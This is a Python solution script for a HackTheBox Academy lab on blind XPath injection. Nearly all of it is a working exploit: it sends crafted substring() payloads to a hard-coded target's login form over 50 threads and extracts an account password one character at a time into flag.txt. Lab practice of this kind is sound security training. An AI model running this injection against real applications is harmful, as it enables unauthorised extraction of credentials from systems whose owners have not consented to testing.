#! /usr/bin/env python3
# Created to solve the lab on HackTheBox Academy called 'XPath Blind Exploitation'.
# This script runs an XPath injection attack on the target

import requests 
import concurrent.futures
import subprocess
import string

# create a character list 
def charlist():
    chars= list(string.printable)
    return chars

# create a number list
def numlist():
    #nums= list(string.digits[1:5])
    nums=list('1')
    return nums

# create a second number list
def numlist2():
    #nums2= list(string.digits[1:])
    nums2= []
    for num in range(1,38):
        nums2.append(num)
    return nums2

# function to perform xpath injection
def xpath_injection(num,num2,char):
    target="83.136.255.119:37078" 
    proxies= {"http":"http://127.0.0.1:8080"}
    headers={"Content-type":"application/x-www-form-urlencoded"}
    #data= f"username='or+substring(name(/accounts/acc/*[{num}]),{num2},1)='{char}&msg=test" 
    data= f"username='or+substring(/accounts/acc[1]/password,{num2},1)='{char}&msg=test"
    response= requests.post(url=f"http://{target}/index.php", proxies=proxies, headers=headers, data=data, allow_redirects=True)
     
    process=subprocess.Popen("grep -i success.*", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    output, errors= process.communicate(input=response.text)
    if output:
        return num, num2, char
    else:
        return None
    
try:
    chars= charlist()
    nums= numlist()
    nums2= numlist2()
    print("Valid chars found below:")
    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        future_to_test = {executor.submit(xpath_injection,num,num2,char): (num, num2, char) for num in nums for num2 in nums2 for char in chars}
        for future in concurrent.futures.as_completed(future_to_test):
                char = future_to_test[future]
                result = future.result()
                if result is not None:                    
                    print(f"{result}")
                    with open("./flag.txt","a") as file:
                        file.write(f"{result}\n")
    
    process= subprocess.Popen("cat ./flag.txt|sort -n -k 2|awk '{print $3}'|tr -d ')\n)'", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    stdout, stderr = process.communicate()
    print(stdout)
except KeyboardInterrupt:
    print("ctrl +c detected, exiting gracefully")
